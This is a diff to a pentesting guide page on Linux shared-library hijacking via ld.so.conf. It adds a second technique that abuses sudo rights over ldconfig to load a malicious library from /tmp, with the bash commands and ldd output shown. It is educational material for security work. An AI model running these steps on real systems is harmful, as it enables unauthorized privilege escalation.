@@ -1,4 +1,4 @@
-# ld.so.conf example
+# ld.so exploit example
 
 ## Prepare the environment
 
@@ -111,9 +111,45 @@ ubuntu
 Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.
 {% endhint %}
 
- 
+###  Other misconfigurations - Same vuln
 
+In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.  
+But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions** in some **config file** inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.
 
+## Exploit 2
 
+**Suppose you have sudo privileges over `ldconfig`**.  
+You can indicate `ldconfig` **where to load the conf files from**, so we can take advantage of it to make `ldconfig` load arbitrary folders.  
+So, lets create the files and folders needed to load "/tmp":
 
+```bash
+cd /tmp
+echo "include /tmp/conf/*" > fake.ld.so.conf
+echo "/tmp" > conf/evil.conf
+```
+
+Now, as indicated in the **previous exploit**, **create the malicious library inside** _**/tmp**_.  
+And finally, lets load the path and check where is the binary loading the library from:
+
+```bash
+ldconfig -f fake.ld.so.conf
+
+ldd sharedvuln
+	linux-vdso.so.1 =>  (0x00007fffa2dde000)
+	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
+```
+
+**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.**
+
+{% hint style="info" %}
+I **didn't find** a reliable way to exploit this vuln if `ldconfig` is configured with the **suid bit**. The following error appear: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
+{% endhint %}
+
+## References
+
+* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
+* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
+* Dab machine in HTB
 
